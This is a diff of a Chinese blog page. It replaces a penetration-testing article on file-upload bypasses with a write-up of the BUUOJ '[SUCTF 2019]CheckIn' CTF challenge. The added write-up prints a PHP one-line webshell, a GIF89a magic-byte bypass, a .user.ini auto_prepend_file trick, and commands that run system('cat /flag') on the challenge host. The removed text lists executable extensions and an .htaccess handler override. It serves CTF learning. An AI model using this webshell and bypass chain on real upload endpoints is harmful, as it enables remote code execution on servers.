@@ -16,26 +16,26 @@
   <meta name="author" content="YY">
   <meta name="keywords" content="">
   
-    <meta name="description" content="文件上传文件上传通常需要结合免杀，上传的文件被其他人触发或者主动连接。这里主要介绍上传的方法。 文件上传的危害文件上传漏洞的危害：  允许上传脚本语言文件且解析 &#x3D;&#x3D;&gt; getshell  允许上传html &#x3D;&#x3D;&gt; xss、csrf、登陆劫持…  允许上传压缩包 &#x3D;&#x3D;&gt; 压缩包DOS、解压文件getshell  允许上传">
+    <meta name="description" content="[SUCTF 2019]CheckIn是一道文件上传的题目。  尝试后发现对扩展名进行了限制，上传一句话木马，提示后缀非法；修改后缀为jpg，提示不能包含&lt;?；修改一句话木马为： 1&lt;script language&#x3D;&quot;php&quot;&gt;eval($_GET[&amp;#x27;cmd&amp;#x27;]);&lt;&#x2F;script&gt;  提示exif_imagetype:not">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[渗透测试] 文件上传">
-<meta property="og:url" content="https://s1n9l3.github.io/2022/11/25/[%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95]%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:title" content="[ctf-web] SUCTF2019-CheckIn">
+<meta property="og:url" content="https://s1n9l3.github.io/2022/12/07/[ctf-web]%20BUCTF2019-ChickIn/index.html">
 <meta property="og:site_name" content="S1n9l3">
-<meta property="og:description" content="文件上传文件上传通常需要结合免杀，上传的文件被其他人触发或者主动连接。这里主要介绍上传的方法。 文件上传的危害文件上传漏洞的危害：  允许上传脚本语言文件且解析 &#x3D;&#x3D;&gt; getshell  允许上传html &#x3D;&#x3D;&gt; xss、csrf、登陆劫持…  允许上传压缩包 &#x3D;&#x3D;&gt; 压缩包DOS、解压文件getshell  允许上传">
+<meta property="og:description" content="[SUCTF 2019]CheckIn是一道文件上传的题目。  尝试后发现对扩展名进行了限制，上传一句话木马，提示后缀非法；修改后缀为jpg，提示不能包含&lt;?；修改一句话木马为： 1&lt;script language&#x3D;&quot;php&quot;&gt;eval($_GET[&amp;#x27;cmd&amp;#x27;]);&lt;&#x2F;script&gt;  提示exif_imagetype:not">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/sum_up.png">
-<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/mind-map.png">
-<meta property="article:published_time" content="2022-11-25T03:18:29.214Z">
-<meta property="article:modified_time" content="2022-12-03T13:02:48.293Z">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221207223543971.png">
+<meta property="article:published_time" content="2022-12-07T14:33:51.710Z">
+<meta property="article:modified_time" content="2022-12-07T14:54:10.451Z">
 <meta property="article:author" content="YY">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="ctf-web">
 <meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/sum_up.png">
+<meta name="twitter:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221207223543971.png">
   
   
   
-  <title>[渗透测试] 文件上传 - S1n9l3</title>
+  <title>[ctf-web] SUCTF2019-CheckIn - S1n9l3</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="[渗透测试] 文件上传"></span>
+            <span id="subtitle" data-typed-text="[ctf-web] SUCTF2019-CheckIn"></span>
           
         </div>
 
@@ -211,8 +211,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-25 11:18" pubdate>
-          2022年11月25日 上午
+        <time datetime="2022-12-07 22:33" pubdate>
+          2022年12月7日 晚上
         </time>
       </span>
     
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.5k 字
+          910 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          22 分钟
+          8 分钟
         
       </span>
     
@@ -272,191 +272,32 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">[渗透测试] 文件上传</h1>
+            <h1 style="display: none">[ctf-web] SUCTF2019-CheckIn</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传通常需要结合免杀，上传的文件被其他人触发或者主动连接。这里主要介绍上传的方法。</p>
-<h2 id="文件上传的危害"><a href="#文件上传的危害" class="headerlink" title="文件上传的危害"></a>文件上传的危害</h2><p>文件上传漏洞的危害：</p>
-<ul>
-<li><p>允许上传脚本语言文件且解析 &#x3D;&#x3D;&gt; getshell</p>
-</li>
-<li><p>允许上传html &#x3D;&#x3D;&gt; xss、csrf、登陆劫持…</p>
-</li>
-<li><p>允许上传压缩包 &#x3D;&#x3D;&gt; 压缩包DOS、解压文件getshell</p>
-</li>
-<li><p>允许上传pdf &#x3D;&#x3D;&gt; pdf xss</p>
-</li>
-<li><p>允许上传swf &#x3D;&#x3D;&gt; swf xss</p>
-</li>
-<li><p>允许上传excel、docx &#x3D;&#x3D;&gt; xxe</p>
-</li>
-<li><p>。。。</p>
-</li>
-</ul>
-<p>不同文件类型可能导致的危害：</p>
-<table>
-<thead>
-<tr>
-<th>文件类型</th>
-<th>危害</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>asp, aspx, php</td>
-<td>webshell, rce</td>
-</tr>
-<tr>
-<td>svg</td>
-<td>stored xss, ssrf, xxe</td>
-</tr>
-<tr>
-<td>gif</td>
-<td>stored xss, ssrf</td>
-</tr>
-<tr>
-<td>csv</td>
-<td>csv injection</td>
-</tr>
-<tr>
-<td>xml</td>
-<td>xxe</td>
-</tr>
-<tr>
-<td>avi</td>
-<td>lfi,ssrf</td>
-</tr>
-<tr>
-<td>html, js</td>
-<td>html injection, xss, open redirect</td>
-</tr>
-<tr>
-<td>png</td>
-<td>pixel flood attack, dos</td>
-</tr>
-<tr>
-<td>zip</td>
-<td>rce via lfi, dos</td>
-</tr>
-<tr>
-<td>pdf</td>
-<td>ssrf, blind xxe, Stored XSS</td>
-</tr>
-</tbody></table>
-<h2 id="文件上传漏洞判断"><a href="#文件上传漏洞判断" class="headerlink" title="文件上传漏洞判断"></a>文件上传漏洞判断</h2><p>如何判断文件上传漏洞是否存在？首先上传正常的文件，确定能够上传的文件类型；然后上传恶意文件，判断过滤的规则，尝试不同的绕过方法。</p>
-<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/sum_up.png" srcset="/img/loading.gif" lazyload alt="sum_up"></p>
-<h2 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h2><p>一些文件上传的绕过方法，</p>
-<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/mind-map.png" srcset="/img/loading.gif" lazyload alt="mind-map"></p>
-<h3 id="一些语言可解析的后缀"><a href="#一些语言可解析的后缀" class="headerlink" title="一些语言可解析的后缀"></a>一些语言可解析的后缀</h3><table>
-<thead>
-<tr>
-<th>语言</th>
-<th>后缀</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>asp&#x2F;aspx</td>
-<td>asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</td>
-</tr>
-<tr>
-<td>php</td>
-<td>php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml</td>
-</tr>
-<tr>
-<td>jsp</td>
-<td>jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</td>
-</tr>
-</tbody></table>
-<h3 id="常见的Content-Type类型"><a href="#常见的Content-Type类型" class="headerlink" title="常见的Content-Type类型"></a>常见的Content-Type类型</h3><blockquote>
-<p>[Http 常见 Content-Type 有哪些？_josavion的博客-CSDN博客_content-type mp3](<a target="_blank" rel="noopener" href="https://blog.csdn.net/josavion/article/details/115260427#:~:text=Http">https://blog.csdn.net/josavion/article/details/115260427#:~:text=Http</a> 常见 Content-Type 有哪些？ 1 请求头–Request-Headers：一般我们在 post 请求中会向服务器发送一些参数，那我们就可以通过这个参数设置,text开头 text%2Fhtml： HTML格式 text%2Fplain：纯文本格式 text%2Fxml： XML格式 图片格式 )</p>
-</blockquote>
-<p>Content-type 定义了 http 请求的数据类型。</p>
-<p>如果设置在请求头中，则定义的是请求体的数据类型；如果设置在响应头中，则定义的是响应体的数据类型；</p>
-<ol>
-<li>请求头–Request-Headers：一般我们在 post 请求中会向服务器发送一些参数，那我们就可以通过这个参数设置 post 的参数格式<ol>
-<li>application&#x2F;json：JSON 数据格式；</li>
-<li>application&#x2F;x-www-form-urlencoded：表单默认的提数据格式；</li>
-<li>multipart&#x2F;form-data：一般用于文件上传；</li>
-</ol>
-</li>
-<li>响应头–Response-Headers：响应头里的 Content-Type 参数会告诉我们响应数据的格式，一般我们可以在请求头里面设置我们想要的数据格式（Accept）；</li>
-<li>以下是常见的Content-Type：<ol>
-<li>text开头<ol>
-<li>text&#x2F;html： HTML格式</li>
-<li>text&#x2F;plain：纯文本格式</li>
-<li>text&#x2F;xml： XML格式</li>
-</ol>
-</li>
-<li>图片格式<ol>
-<li>image&#x2F;gif ：gif 图片格式</li>
-<li>image&#x2F;jpeg ：jpg 图片格式</li>
-<li>image&#x2F;png：png 图片格式</li>
-</ol>
-</li>
-<li>application开头<ol>
-<li>application&#x2F;xhtml+xml：XHTML 格式</li>
-<li>application&#x2F;xml：XML 数据格式</li>
-<li>application&#x2F;atom+xml：Atom XML 聚合格式</li>
-<li>application&#x2F;json：JSON 数据格式</li>
-<li>application&#x2F;pdf：pdf 格式</li>
-<li>application&#x2F;msword：Word 文档格式</li>
-<li>application&#x2F;octet-stream：二进制流数据（如常见的文件下载）</li>
-<li>application&#x2F;x-www-form-urlencoded：表单发送默认格式</li>
-</ol>
-</li>
-<li>媒体文件<ol>
-<li>audio&#x2F;x-wav：wav文件</li>
-<li>audio&#x2F;x-ms-wma：w文件</li>
-<li>audio&#x2F;mp3：mp3文件</li>
-<li>video&#x2F;x-ms-wmv：wmv文件</li>
-<li>video&#x2F;mpeg4：mp4文件</li>
-<li>video&#x2F;avi：avi文件</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-<h3 id="常见文件头标识"><a href="#常见文件头标识" class="headerlink" title="常见文件头标识"></a>常见文件头标识</h3><p>文件幻数是用来唯一标识文件类型的一系列数字（十六进制），也就是常说的文件头，当白名单限制了文件幻数时，就要给文件制造可以通过检测的文件头即可：</p>
-<table>
-<thead>
-<tr>
-<th>文件类型</th>
-<th>头标识</th>
-<th>其他</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>jpg</td>
-<td>FF D8 FF E0</td>
-<td></td>
-</tr>
-<tr>
-<td>gif</td>
-<td>47 49 46 38</td>
-<td>GIF89a</td>
-</tr>
-<tr>
-<td>png</td>
-<td>89 50 4E 47</td>
-<td></td>
-</tr>
-<tr>
-<td>html</td>
-<td>68 74 6D 6C 3E 10</td>
-<td></td>
-</tr>
-<tr>
-<td>xml</td>
-<td>3C 3F 78 6D 6C</td>
-<td></td>
-</tr>
-</tbody></table>
-<h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;Aries.png&quot;</span>&gt;</span><br><span class="hljs-attribute">setHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span> <br></code></pre></td></tr></table></figure>
+                <h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>是一道文件上传的题目。</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221207223543971.png" srcset="/img/loading.gif" lazyload alt="image-20221207223543971"></p>
+<p>尝试后发现对扩展名进行了限制，上传一句话木马，提示后缀非法；修改后缀为<code>jpg</code>，提示不能包含<code>&lt;?</code>；修改一句话木马为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>将<code>Aries.png</code>文件作为PHP文件解析。</p>
-<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-fuzz-dic-builder">c0ny1&#x2F;upload-fuzz-dic-builder: 上传漏洞fuzz字典生成脚本 (github.com)</a></p>
+<p>提示<code>exif_imagetype:not image!</code>；添加<code>GIF89a</code>文件头，上传成功。</p>
+<p>到这里考虑如何能够执行木马，首先想到的是<code>.htaccess</code>，然后使用：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GIF89a</span><br><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;three.jpg&quot;</span>&gt;</span><br><span class="hljs-attribute">setHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>但是这个好像没有成功，没有能够正确解析<code>three.jpg</code>，可能是因为文件头的原因。</p>
+<p>然后就发现了<code>.user.ini</code>文件，内容为：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=three.jpg<br></code></pre></td></tr></table></figure>
+
+<p>这段代码表示让所有php文件自动包含某个文件，由于该目录下还有<code>index.php</code>文件，所以就可以通过这个文件来触发木马。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># </span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">2</span>df51d2d-<span class="hljs-number">2579</span>-<span class="hljs-number">4</span>e48-<span class="hljs-number">9800</span>-<span class="hljs-number">6</span>a23e289441a.node4.buuoj.cn:<span class="hljs-number">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php?cmd=var_dump(scandir(%<span class="hljs-number">22</span>/%<span class="hljs-number">22</span>));<br><span class="hljs-comment"># </span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">2</span>df51d2d-<span class="hljs-number">2579</span>-<span class="hljs-number">4</span>e48-<span class="hljs-number">9800</span>-<span class="hljs-number">6</span>a23e289441a.node4.buuoj.cn:<span class="hljs-number">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php?cmd=system(%<span class="hljs-number">27</span>cat%<span class="hljs-number">20</span>/flag%<span class="hljs-number">27</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86772765">Web安全-一句话木马_Tr0e的博客-CSDN博客_一句话木马</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/85334893">Web安全-文件上传漏洞与WAF绕过_Tr0e的博客-CSDN博客</a></p>
 
                 
               </div>
@@ -475,7 +316,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
   
   
 
@@ -490,7 +331,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>
+        <a href="/tags/ctf/">#ctf</a>
+      
+        <a href="/tags/ctf-web/">#ctf-web</a>
       
         <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">#文件上传</a>
       
@@ -504,8 +347,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>[渗透测试] 文件上传</div>
-      <div>https://s1n9l3.github.io/2022/11/25/[渗透测试] 文件上传/</div>
+      <div>[ctf-web] SUCTF2019-CheckIn</div>
+      <div>https://s1n9l3.github.io/2022/12/07/[ctf-web] BUCTF2019-ChickIn/</div>
     </div>
     <div class="license-meta">
       
@@ -517,7 +360,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年11月25日</div>
+          <div>2022年12月7日</div>
         </div>
       
       
@@ -549,18 +392,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/11/26/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E8%AF%AD%E6%B3%95-01-ql%E5%9F%BA%E7%A1%80/" title="[代码审计] codeql语法-01-ql基础">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">[代码审计] codeql语法-01-ql基础</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/11/24/%5Bctf-web%5D%20RoarCTF2019-EasyCalc/" title="[ctf-web] RoarCTF2019-EasyCalc">
-                        <span class="hidden-mobile">[ctf-web] RoarCTF2019-EasyCalc</span>
+                      <a href="/2022/12/05/%5Bctf-web%5D%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL/" title="[ctf-web] 极客大挑战2019-HardSQL">
+                        <span class="hidden-mobile">[ctf-web] 极客大挑战2019-HardSQL</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
